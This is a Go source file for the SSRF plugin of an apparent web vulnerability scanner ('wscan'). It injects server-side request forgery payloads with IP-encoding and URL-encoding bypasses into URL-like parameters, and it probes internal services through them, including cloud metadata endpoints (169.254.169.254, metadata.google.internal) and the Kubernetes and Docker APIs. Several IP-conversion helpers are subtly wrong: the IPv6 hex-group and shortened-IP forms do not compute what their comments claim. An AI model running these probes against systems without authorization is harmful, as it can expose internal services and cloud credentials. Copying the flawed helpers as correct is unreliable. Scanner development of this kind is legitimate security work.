/*
*
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
4
*/
package ssrf

import (
	"context"
	"fmt"
	"regexp"
	"strings"
	"wscan/core/http"
	"wscan/core/model"
	"wscan/core/plugins/base"
	"wscan/core/reverse"
	"wscan/core/utils"
	logger "wscan/core/utils/log"
)

type Config struct {
	base.PluginBaseConfig      `json:",inline" yaml:",inline"`
	DetectInternalService      bool `json:"detect_internal_service" yaml:"detect_internal_service" #:"是否检测内部服务"`
	DangerouslyUseCommentInSQL bool `json:"-" yaml:"-"`
}

type SSRF struct {
	base.PluginMixinInitConfig
	base.PluginMixinClose
}

func (c *Config) BaseConfig() *base.PluginBaseConfig {
	return &c.PluginBaseConfig
}

func (*SSRF) Close() error {
	return nil
}

func (*SSRF) DefaultConfig() base.PluginConfigInterface {
	config := &Config{PluginBaseConfig: base.PluginBaseConfig{
		Name:    "ssrf",
		Enabled: true,
	}}
	return config
}

// InternalService defines a local service to probe via SSRF
type InternalService struct {
	Name    string
	Address string
	Pattern string // Response matching pattern
	Proto   string // "http", "tcp", or "skip" to avoid sending HTTP to non-HTTP services
}

var internalServices = []InternalService{
	{Name: "SSH", Address: "127.0.0.1:22", Pattern: `(?i)SSH`, Proto: "skip"},
	{Name: "Redis", Address: "127.0.0.1:6379", Pattern: `-ERR|PONG`, Proto: "skip"},
	{Name: "MySQL", Address: "127.0.0.1:3306", Pattern: `mysql`, Proto: "skip"},
	{Name: "PostgreSQL", Address: "127.0.0.1:5432", Pattern: `PostgreSQL`, Proto: "skip"},
	{Name: "MongoDB", Address: "127.0.0.1:27017", Pattern: `MongoDB`, Proto: "skip"},
	{Name: "Elasticsearch", Address: "127.0.0.1:9200", Pattern: `cluster_name|lucene_version`, Proto: "http"},
	{Name: "Cloud Metadata (AWS)", Address: "169.254.169.254", Pattern: `ami-id|instance-id|iam`, Proto: "http"},
	{Name: "Cloud Metadata (GCP)", Address: "metadata.google.internal", Pattern: `instance|project`, Proto: "http"},
	{Name: "Kubernetes API", Address: "127.0.0.1:6443", Pattern: `kubernetes|apiVersion`, Proto: "http"},
	{Name: "Docker API", Address: "127.0.0.1:2375", Pattern: `docker|containers`, Proto: "http"},
}

// getSSRFPayloads generates SSRF payloads with various bypass techniques
func getSSRFPayloads(reverseURL string) []string {
	payloads := []string{
		// Basic payload
		reverseURL,
		// URL encoding bypass
		strings.Replace(reverseURL, "http", "h%74tp", 1),
		// Double URL encoding
		strings.Replace(reverseURL, "http", "h%2574tp", 1),
	}

	// Extract host and port from reverseURL for bypass payloads
	hostPort := extractHostPort(reverseURL)
	if hostPort != "" {
		bypassPayloads := []string{
			// IP decimal bypass: 127.0.0.1 -> 2130706433
			fmt.Sprintf("http://%s/%s", ipToDecimal(hostPort), extractPath(reverseURL)),
			// IP octal bypass: 127.0.0.1 -> 0177.0.0.1
			fmt.Sprintf("http://%s/%s", ipToOctal(hostPort), extractPath(reverseURL)),
			// IP hex bypass: 127.0.0.1 -> 0x7f000001
			fmt.Sprintf("http://%s/%s", ipToHex(hostPort), extractPath(reverseURL)),
			// Shortened IP: 127.0.0.1 -> 127.1
			fmt.Sprintf("http://%s/%s", ipShortened(hostPort), extractPath(reverseURL)),
			// IPv6 loopback
			fmt.Sprintf("http://[::1]/%s", extractPath(reverseURL)),
			// IPv6 mapped IPv4
			fmt.Sprintf("http://[0:0:0:0:0:ffff:%s]/%s", ipToHexGroups(hostPort), extractPath(reverseURL)),
		}
		payloads = append(payloads, bypassPayloads...)
	}

	return payloads
}

// extractHostPort extracts host:port from a URL string
func extractHostPort(urlStr string) string {
	if !strings.HasPrefix(urlStr, "http://") && !strings.HasPrefix(urlStr, "https://") {
		return ""
	}
	trimmed := strings.TrimPrefix(strings.TrimPrefix(urlStr, "https://"), "http://")
	parts := strings.SplitN(trimmed, "/", 2)
	if len(parts) > 0 {
		return parts[0]
	}
	return ""
}

// extractPath extracts the path portion from a URL string
func extractPath(urlStr string) string {
	parts := strings.SplitN(strings.TrimPrefix(urlStr, "http://"), "/", 2)
	if len(parts) > 1 {
		return parts[1]
	}
	return ""
}

// ipToDecimal converts an IP address to its decimal representation
func ipToDecimal(hostPort string) string {
	host := strings.SplitN(hostPort, ":", 2)[0]
	parts := strings.Split(host, ".")
	if len(parts) != 4 {
		return hostPort
	}
	var dec uint32
	for _, p := range parts {
		var v int
		fmt.Sscanf(p, "%d", &v)
		dec = dec*256 + uint32(v)
	}
	port := ""
	if idx := strings.Index(hostPort, ":"); idx >= 0 {
		port = hostPort[idx:]
	}
	return fmt.Sprintf("%d%s", dec, port)
}

// ipToOctal converts an IP address to its octal representation
func ipToOctal(hostPort string) string {
	host := strings.SplitN(hostPort, ":", 2)[0]
	parts := strings.Split(host, ".")
	if len(parts) != 4 {
		return hostPort
	}
	octalParts := make([]string, 4)
	for i, p := range parts {
		var v int
		fmt.Sscanf(p, "%d", &v)
		octalParts[i] = fmt.Sprintf("0%o", v)
	}
	port := ""
	if idx := strings.Index(hostPort, ":"); idx >= 0 {
		port = hostPort[idx:]
	}
	return fmt.Sprintf("%s%s", strings.Join(octalParts, "."), port)
}

// ipToHex converts an IP address to its hex representation
func ipToHex(hostPort string) string {
	host := strings.SplitN(hostPort, ":", 2)[0]
	parts := strings.Split(host, ".")
	if len(parts) != 4 {
		return hostPort
	}
	var dec uint32
	for _, p := range parts {
		var v int
		fmt.Sscanf(p, "%d", &v)
		dec = dec*256 + uint32(v)
	}
	port := ""
	if idx := strings.Index(hostPort, ":"); idx >= 0 {
		port = hostPort[idx:]
	}
	return fmt.Sprintf("0x%x%s", dec, port)
}

// ipShortened converts an IP to shortened form (e.g., 127.0.0.1 -> 127.1)
func ipShortened(hostPort string) string {
	host := strings.SplitN(hostPort, ":", 2)[0]
	parts := strings.Split(host, ".")
	if len(parts) != 4 {
		return hostPort
	}
	port := ""
	if idx := strings.Index(hostPort, ":"); idx >= 0 {
		port = hostPort[idx:]
	}
	return fmt.Sprintf("%s.1%s", parts[0], port)
}

// ipToHexGroups converts IP to colon-separated hex groups for IPv6 mapped format
func ipToHexGroups(hostPort string) string {
	host := strings.SplitN(hostPort, ":", 2)[0]
	parts := strings.Split(host, ".")
	if len(parts) != 4 {
		return hostPort
	}
	return fmt.Sprintf("%s%s:%s%s", parts[0], parts[1], parts[2], parts[3])
}

// isPotentialURLParam checks if a parameter value might be a URL or could accept a URL
func isPotentialURLParam(param http.Parameter) bool {
	value := strings.ToLower(param.Value)
	// Check for parameters that already contain URLs
	if strings.HasPrefix(value, "http") {
		return true
	}
	// Check for common URL parameter names
	key := strings.ToLower(param.Key)
	urlParamKeys := []string{"url", "link", "redirect", "uri", "path", "src", "source", "href", "site", "web", "blog", "callback", "return", "next", "dest", "destination", "goto", "feed", "img", "image", "load", "proxy", "request", "navigate", "continue", "file", "reference", "domain", "query"}
	for _, k := range urlParamKeys {
		if strings.Contains(key, k) {
			return true
		}
	}
	return false
}

// ssrfReflectFinger creates the SSRF reverse-connection detection finger
func ssrfReflectFinger() *base.Finger {
	return &base.Finger{
		CheckAction: func(ctx context.Context, ab *base.Apollo) error {
			flow := ab.GetTargetFlow()
			logger.Debugf("Start to detect SSRF %s", flow.Request.URL().String())
			for _, param := range flow.Request.ParamsAll() {
				// Detect all URL-type parameters, not only those starting with "http"
				if !isPotentialURLParam(param) {
					continue
				}
				unit := ab.Reverse.Register(nil)
				visitURL := unit.GetVisitURL()

				for _, payload := range getSSRFPayloads(visitURL) {
					parameter := http.Parameter{Position: param.Position, Key: param.Key, Value: payload}
					req := flow.Request.Mutate(&parameter)
					res, err := ab.HTTPClient.Respond(ctx, req)
					if err != nil {
						continue
					}
					// Capture variables for closure
					capturedReq := req
					capturedRes := res
					capturedParam := param
					capturedPayload := payload
					capturedUnit := unit
					capturedAb := ab
					capturedFlow := flow
					capturedUnit.OnVisit(func(event *reverse.Event) error {
						v := capturedAb.NewWebVuln(capturedReq, capturedRes, &capturedParam)
						if v != nil {
							v.SetTargetURL(capturedFlow.Request.URL())
							v.Payload = capturedPayload
							v.Param = &http.Parameter{Position: capturedParam.Position, Key: capturedParam.Key, Value: capturedPayload}
							capturedAb.OutputVuln(v)
						}
						return nil
					})
					capturedUnit.Fetch(0)
				}
			}
			return nil
		},
		Channel:     "web-generic",
		NeedReverse: true,
		Binding:     &model.VulnBinding{ID: "ssrf/default", Plugin: "ssrf/reflected", Category: "ssrf", Severity: model.SeverityHigh},
	}
}

// internalServiceFinger creates the internal service detection finger
func internalServiceFinger() *base.Finger {
	return &base.Finger{
		CheckAction: func(ctx context.Context, ab *base.Apollo) error {
			flow := ab.GetTargetFlow()
			logger.Debugf("Start to detect SSRF internal service %s", flow.Request.URL().String())
			for _, param := range flow.Request.ParamsAll() {
				if !isPotentialURLParam(param) {
					continue
				}
				for _, svc := range internalServices {
					// Skip non-HTTP services to avoid sending HTTP requests to them
					// These services (SSH, Redis, MySQL, etc.) use custom protocols
					// and sending HTTP requests would be meaningless
					if svc.Proto == "skip" {
						continue
					}
					// Replace parameter value with internal service address
					parameter := http.Parameter{
						Position: param.Position,
						Key:      param.Key,
						Value:    svc.Address,
					}
					req := flow.Request.Mutate(&parameter)
					res, err := ab.HTTPClient.Respond(ctx, req)
					if err != nil {
						continue
					}
					matched, _ := regexp.MatchString(svc.Pattern, res.Text)
					if matched {
						v := ab.NewWebVuln(req, res, &param)
						if v != nil {
							v.SetTargetURL(flow.Request.URL())
							v.Payload = fmt.Sprintf("internal service probe: %s (%s)", svc.Name, svc.Address)
							ab.OutputVuln(v)
						}
						return nil
					}
				}
			}
			return nil
		},
		Channel: "web-generic",
		Binding: &model.VulnBinding{
			ID:       "ssrf/internal-service",
			Plugin:   "ssrf/internal-service",
			Category: "ssrf",
			Severity: model.SeverityHigh,
		},
	}
}

func (p *SSRF) Fingers() []*base.Finger {
	fingers := []*base.Finger{}
	fingers = append(fingers, ssrfReflectFinger())

	cfg, ok := p.GetConfig().(*Config)
	if ok && cfg != nil && cfg.DetectInternalService {
		fingers = append(fingers, internalServiceFinger())
	}
	return fingers
}

func (p *SSRF) GetConfig() base.PluginConfigInterface {
	return p.PluginMixinInitConfig.GetConfig()
}

func (p *SSRF) Init(ctx context.Context, pci base.PluginConfigInterface, ab *base.ApolloBase) error {
	logger.Debug("ssrf Plugin init")
	return p.PluginMixinInitConfig.Init(ctx, pci, ab)
}

func init() {
	_ = utils.RandLetters(8) // ensure utils package is referenced
}
